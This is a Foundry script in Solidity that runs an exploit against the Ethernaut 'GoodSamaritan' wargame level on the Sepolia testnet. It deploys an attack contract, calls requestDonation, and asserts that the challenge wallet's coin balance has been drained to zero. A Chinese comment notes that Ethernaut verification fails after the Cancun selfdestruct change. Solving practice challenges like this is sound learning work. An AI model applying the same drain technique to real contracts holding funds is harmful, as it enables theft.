// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Cracked27_GoodSamaritan.sol";

//forge script  --rpc-url sepolia --account metamask  Cracked27_GoodSamaritanScript --broadcast
contract Cracked27_GoodSamaritanScript is Script {
    address ethernaut_contracts;

    function setUp() public {
        ethernaut_contracts = vm.parseAddress(vm.envString("GoodSamaritan_address"));
    }

    //坎昆升级后自毁仅构造函数删代码，函数不删代码，ethernaut无法验证通过
    function run() public {
        vm.startBroadcast();
        Cracked27_GoodSamaritan attack = new Cracked27_GoodSamaritan(ethernaut_contracts);
        attack.requestDonation();
        Wallet wallet = GoodSamaritan(ethernaut_contracts).wallet();
        Coin coin = wallet.coin();

        require(coin.balances(address(wallet)) == 0, "coin not clear");
        vm.stopBroadcast();
    }
}
